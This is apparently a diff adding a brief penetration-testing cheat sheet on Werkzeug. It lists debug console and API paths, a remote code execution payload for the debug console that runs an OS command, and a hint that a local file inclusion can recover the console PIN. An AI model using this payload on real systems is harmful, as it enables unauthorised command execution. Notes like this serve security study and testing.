@@ -1,0 +1,14 @@
+### werkzeug ###
+## links
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
+
+## console
+http://$h/console							# debug console if activated
+http://$h/api								# api documentation
+
+
+## console RCE
+http://$h/console
+> __import__('os').popen('whoami').read();				# exec python
+# if PIN is activated, we need a LFI to retrieve the PIN
+
